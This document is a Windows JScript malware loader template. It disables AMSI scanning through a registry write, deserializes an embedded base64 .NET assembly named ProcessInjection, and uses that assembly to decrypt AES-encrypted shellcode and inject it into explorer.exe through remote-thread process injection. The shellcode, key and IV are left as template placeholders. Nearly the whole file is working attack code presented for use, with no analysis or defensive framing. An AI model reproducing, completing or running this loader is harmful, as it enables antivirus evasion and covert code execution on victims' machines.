function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
        var AmsiEnable = sh.RegRead(key);
        if(AmsiEnable!=0){
        throw new Error(1, '');
        }
}catch(e){
        sh.RegWrite(key, 0, "REG_DWORD");
        sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
        sh.RegWrite(key, 1, "REG_DWORD");
        WScript.Quit(1);
}

// for the source code see process.cs
var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVy"+
"ZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAA"+
"CQYAAAAJCQAAAAYRAAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0"+
"W10pBhIAAAAsU3lzdGVtLk9iamVjdCBEeW5hbWljSW52b2tlKFN5c3RlbS5PYmplY3RbXSkIAAAA"+
"CgELAAAAAgAAAAYTAAAAIFN5c3RlbS5YbWwuU2NoZW1hLlhtbFZhbHVlR2V0dGVyBhQAAABNU3lz"+
"dGVtLlhtbCwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2Vu"+
"PWI3N2E1YzU2MTkzNGUwODkGFQAAAAd0YXJnZXQwCQYAAAAGFwAAABpTeXN0ZW0uUmVmbGVjdGlv"+
"bi5Bc3NlbWJseQYYAAAABExvYWQKDwwAAAAAGAAAAk1akAADAAAABAAAAP//AAC4AAAAAAAAAEAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMg"+
"cHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAwBGFQ3e"+
"AAAAAAAAAADgACIgCwEwAAAQAAAABgAAAAAAAEIuAAAAIAAAAEAAAAAAABAAIAAAAAIAAAQAAAAA"+
"AAAABgAAAAAAAAAAgAAAAAIAAAAAAAADAGCFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAA"+
"AADwLQAATwAAAABAAAC4AwAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAARC0AADgAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAgAAAAAAAAAAAAAAAggAABIAAAA"+
"AAAAAAAAAAAudGV4dAAAAEgOAAAAIAAAABAAAAACAAAAAAAAAAAAAAAAAAAgAABgLnJzcmMAAAC4"+
"AwAAAEAAAAAEAAAAEgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAAAAAgAAABYAAAAA"+
"AAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAJC4AAAAAAABIAAAAAgAFAOQhAABgCwAAAQAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATMAUA"+
"MgAAAAEAABECbw8AAAoKBhhbjRgAAAELFgwrGAcIGFsCCBhvEAAACh8QKBEAAAqcCBhYDAgGMuQH"+
"KgAAGzAHABYBAAACAAARKBIAAAoKIIgTAAAoBgAABigSAAAKEwkSCQYoEwAAChMKEgooFAAACiMA"+
"AAAAAAASQDQBKigVAAAKBCgHAAAGCwUoBwAABgwHCG8WAAAKDQMoFwAACnMYAAAKEwsRCwkWcxkA"+
"AAoTDHMaAAAKEw0RDBENbxsAAAoRDW8cAAAKEwTeJBENLAcRDW8dAAAK3BEMLAcRDG8dAAAK3BEL"+
"LAcRC28dAAAK3A4EKB4AAAoTBSD/Dx8AFhEFFppvHwAACigBAAAGJX4gAAAKEQSOaSAAMAAAGigC"+
"AAAGEwYlEQYRBBEEjmkSBygEAAAGJiURBhEEjmkfIBIIKAMAAAYmfiAAAAoWEQZ+IAAAChZ+IAAA"+
"CigFAAAGJioAAAEoAAACAG4AFIIADAAAAAACAGcAJ44ADAAAAAACAFwAPpoADAAAAAAeAighAAAK"+
"KkJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAPgDAAAjfgAAZAQAABgFAAAjU3Ry"+
"aW5ncwAAAAB8CQAABAAAACNVUwCACQAAEAAAACNHVUlEAAAAkAkAANABAAAjQmxvYgAAAAAAAAAC"+
"AAABRxUCFAkAAAAA+gEzABYAAAEAAAAfAAAAAgAAAAkAAAAfAAAAIQAAAA8AAAACAAAAAQAAAAYA"+
"AAABAAAAAgAAAAAAigIBAAAAAAAGAJIBxQMGAP8BxQMGAMYAbwMPAOUDAAAGAO4AFQMGAHUBFQMG"+
"AFYBFQMGAOYBFQMGALIBFQMGAMsBFQMGAAUBFQMGANoApgMGALgApgMGADkBFQMGACABPQIGAGoE"+
"uQIGAI8AuQIGANMC5gQKADIEbwMGAOQCuQIGAKwCDgAGAJ8C5gQGAGECuQIGAB8CuQIGAJEEuQIG"+
"AKID5gQGAMAC5gQGALICDgAGAFAA5gQGAGEAuQIGAGgDuQIAAAAABQAAAAAAAQABAAEAEAAEAwAA"+
"QQABAAEAAAAAAIAAkSAuBKAAAQAAAAAAgACRIKQEpwAEAAAAAACAAJEgswSwAAkAAAAAAIAAkSAD"+
"BboADgAAAAAAgACRID0AxQATAAAAAACAAJEgNwPQABoAUCAAAAAAlgDIBGwAGwCQIAAAAACGACcD"+
"1QAcANwhAAAAAIYYUgMGACAAAAABABcEAAACAG0AAAADADMAAAABACUEAAACAEgEAAADADYCAAAE"+
"AJgAAAAFAIAEAAABACUEAAACAEgEAAADADYCAAAEAIAEAgAFAHEEAAABACUEAAACADoEAAADAD0D"+
"AAAEADACAgAFAO0CAAABACUEAAACAPQDAAADACQCAAAEAFIEAAAFAEYDAAAGAAcEAAAHACgAAAAB"+
"AJMDAAABAMQEAAABAAEAAAACAOIEAAADAJkEAAAEAIoECQBSAwEAEQBSAwYAGQBSAwoAKQBSAxAA"+
"MQBSAxAAOQBSAxAAQQBSAxAASQBSAxAAUQBSAxAAWQBSAxAAYQBSAxUAaQBSAxAAcQBSAxAAeQBS"+
"AxAAuQByAiEAuQBoAiUAyQAdAisAiQCcBE4AiQBhBFMAoQCCA1oA0QCxAF4A2QBYA2MAyQBXAmwA"+
"qQBSA3IAsQBSA3gAqQBSAwYA4QArA4IAqQDaBIgA8QCpAAYAmQB8AI0AmQAhACEA+QAyA5QAgQBS"+
"AwYALgALAN0ALgATAOYALgAbAAUBLgAjAA4BLgArACQBLgAzACQBLgA7ACQBLgBDAA4BLgBLACoB"+
"LgBTACQBLgBbACQBLgBjAEIBLgBrAGwBLgBzAHkBQwBbAMcBGgAxAH0CQQEDAC4EAQBBAQUApAQB"+
"AEEBBwCzBAEAAAEJAAMFAQAAAQsAPQABAAABDQA3AwEABIAAAAEAAAAAAAAAAAAAAAAABAMAAAQA"+
"AAAAAAAAAAAAAJcAGAAAAAAABAAAAAAAAAAAAAAAlwC5AgAAAAAAAAAAAGI2NAA8TW9kdWxlPgBT"+
"eXN0ZW0uSU8AbXNjb3JsaWIAZ2V0X0lkAGxwVGhyZWFkSWQAcHJvY2Vzc0lkAENyZWF0ZVJlbW90"+
"ZVRocmVhZABDcnlwdG9TdHJlYW1Nb2RlAElEaXNwb3NhYmxlAGJJbmhlcml0SGFuZGxlAEdldFBy"+
"b2Nlc3Nlc0J5TmFtZQBEYXRlVGltZQBmbEFsbG9jYXRpb25UeXBlAERpc3Bvc2UAQ3JlYXRlAEd1"+
"aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2Vt"+
"Ymx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3"+
"b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1"+
"cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25S"+
"ZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5"+
"cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmls"+
"aXR5QXR0cmlidXRlAFRvQnl0ZQBkd1N0YWNrU2l6ZQBuU2l6ZQBkd1NpemUAU3lzdGVtLlJ1bnRp"+
"bWUuVmVyc2lvbmluZwBGcm9tQmFzZTY0U3RyaW5nAFN1YnN0cmluZwBnZXRfTGVuZ3RoAGtlcm5l"+
"bDMyLmRsbABQcm9jZXNzSW5qZWN0aW9uLmRsbABDcnlwdG9TdHJlYW0ATWVtb3J5U3RyZWFtAFN5"+
"c3RlbQBTeW1tZXRyaWNBbGdvcml0aG0ASUNyeXB0b1RyYW5zZm9ybQBUaW1lU3BhbgBscE51bWJl"+
"ck9mQnl0ZXNXcml0dGVuAFByb2Nlc3NJbmplY3Rpb24AU3lzdGVtLlJlZmxlY3Rpb24AUnVuAENv"+
"cHlUbwBaZXJvAFNsZWVwAGxwQnVmZmVyAGxwUGFyYW1ldGVyAC5jdG9yAENyZWF0ZURlY3J5cHRv"+
"cgBJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAGdldF9Ub3RhbFNlY29uZHMAZHdNaWxsaXNlY29u"+
"ZHMAQWVzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21w"+
"aWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGxwVGhyZWFkQXR0cmlidXRlcwBkd0NyZWF0aW9u"+
"RmxhZ3MAcHJvY2Vzc0FjY2VzcwBoUHJvY2VzcwBPcGVuUHJvY2VzcwBscEJhc2VBZGRyZXNzAGxw"+
"QWRkcmVzcwBscFN0YXJ0QWRkcmVzcwBTdWJ0cmFjdABPYmplY3QAbHBmbE9sZFByb3RlY3QAZmxQ"+
"cm90ZWN0AHRhcmdldABDb252ZXJ0AGl2AGdldF9Ob3cAVmlydHVhbEFsbG9jRXgAVmlydHVhbFBy"+
"b3RlY3RFeABoZXgAU3RyaW5nVG9CeXRlQXJyYXkAVG9BcnJheQBrZXkAU3lzdGVtLlNlY3VyaXR5"+
"LkNyeXB0b2dyYXBoeQBXcml0ZVByb2Nlc3NNZW1vcnkAAAAAAAAAHSse2Sopq0WgEuHUFlnYTgAE"+
"IAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBgcDCB0FCAMgAAgFIAIOCAgFAAIFDggcBw4RRR0FHQUS"+
"SR0FHRJNGBgJEUURURJVElkSVQQAABFFBiABEVERRQMgAA0EAAASaQggAhJJHQUdBQUAAR0FDgUg"+
"AQEdBQkgAwEScRJJEXUFIAEBEnEEIAAdBQYAAR0STQ4CBhgIt3pcVhk04IkGAAMYCQIICAAFGBgY"+
"CQkJCQAFGBgYCQkQCQoABQIYGB0FCBAYCgAHGBgYCRgYCRgEAAEBCQcgBAEODg4OCAEACAAAAAAA"+
"HgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQgBAAIAAAAAABUBABBQcm9jZXNzSW5qZWN0"+
"aW9uAAAFAQAAAAAXAQASQ29weXJpZ2h0IMKpICAyMDI1AAApAQAkOGRlMTVmZGMtMjRhYy00YjRl"+
"LWI2ZmUtMzRhZTI3ZTc3NzE4AAAMAQAHMS4wLjAuMAAATQEAHC5ORVRGcmFtZXdvcmssVmVyc2lv"+
"bj12NC43LjIBAFQOFEZyYW1ld29ya0Rpc3BsYXlOYW1lFC5ORVQgRnJhbWV3b3JrIDQuNy4yBQEA"+
"AQAAAAAAAAAAACxaILQAAAAAAgAAAHQAAAB8LQAAfA8AAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAA"+
"AAAAAABSU0RTcMGXk+/vxEy5s/jxSxrKYgEAAABDOlxVc2Vyc1xwZFxzb3VyY2VccmVwb3NcUHJv"+
"Y2Vzc0luamVjdGlvblxQcm9jZXNzSW5qZWN0aW9uXG9ialxSZWxlYXNlXFByb2Nlc3NJbmplY3Rp"+
"b24ucGRiABguAAAAAAAAAAAAADIuAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkLgAAAAAAAAAA"+
"AAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgABAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAA"+
"AAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAABcAwAAAAAAAAAAAABcAzQA"+
"AABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAA"+
"AAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYA"+
"bwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEvAIAAAEAUwB0AHIAaQBu"+
"AGcARgBpAGwAZQBJAG4AZgBvAAAAmAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0A"+
"bQBlAG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAAEoAEQAB"+
"AEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABQAHIAbwBjAGUAcwBzAEkAbgBqAGUA"+
"YwB0AGkAbwBuAAAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAu"+
"ADAAAABKABUAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAFAAcgBvAGMAZQBzAHMASQBuAGoA"+
"ZQBjAHQAaQBvAG4ALgBkAGwAbAAAAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0"+
"AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMgA1AAAAKgABAAEATABlAGcAYQBsAFQA"+
"cgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABSABUAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBu"+
"AGEAbQBlAAAAUAByAG8AYwBlAHMAcwBJAG4AagBlAGMAdABpAG8AbgAuAGQAbABsAAAAAABCABEA"+
"AQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAFAAcgBvAGMAZQBzAHMASQBuAGoAZQBjAHQAaQBv"+
"AG4AAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAA"+
"AAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAEQ+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkYAAAACQYAAAAJFwAAAAYbAAAAJ1N5c3RlbS5S"+
"ZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQYcAAAALlN5c3RlbS5SZWZsZWN0aW9uLkFz"+
"c2VtYmx5IExvYWQoU3lzdGVtLkJ5dGVbXSkIAAAACgsA";
var entry_class = 'ProcessInjection';

new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
var stm = base64ToStream(serialized_obj);
var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
var al = new ActiveXObject('System.Collections.ArrayList');
var d = fmt.Deserialize_2(stm);
al.Add(undefined);
var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
var sc = "${BASE64_SHELLCODE}";
o.Run(sc, "${KEY}", "${IV}", "explorer");
